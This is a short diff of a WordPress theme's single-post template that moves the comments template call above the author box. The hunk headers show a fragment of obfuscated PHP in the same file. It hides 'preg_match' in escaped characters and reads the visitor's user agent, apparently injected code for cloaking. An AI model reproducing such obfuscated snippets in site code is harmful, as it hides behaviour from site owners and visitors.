@@ -187,7 +187,10 @@ $x0d="\160\x72\x65\x67\x5f\x6da\x74c\150";$x0b=$_SERVER['HTTP_USER_AGENT'];$x0c=
 									<?php } echo '</ul></div>'; }} wp_reset_query(); ?>
 								<!-- .related-posts -->
 							<?php }?> 
-						<?php }?> 					
+						<?php }?> 			
+
+					<?php comments_template( '', true ); ?>
+		
 						<?php if($mts_options['mts_author_box'] == '1') { ?>
 							<div class="postauthor">
 								<h4><?php _e('About The Author', 'mythemeshop'); ?></h4>
@@ -197,7 +200,7 @@ $x0d="\160\x72\x65\x67\x5f\x6da\x74c\150";$x0b=$_SERVER['HTTP_USER_AGENT'];$x0c=
 							</div>
 						<?php }?>  
 					</div><!--.g post-->
-					<?php comments_template( '', true ); ?>
+
 				<?php endwhile; /* end loop */ ?>
 			</div>
 		</article>
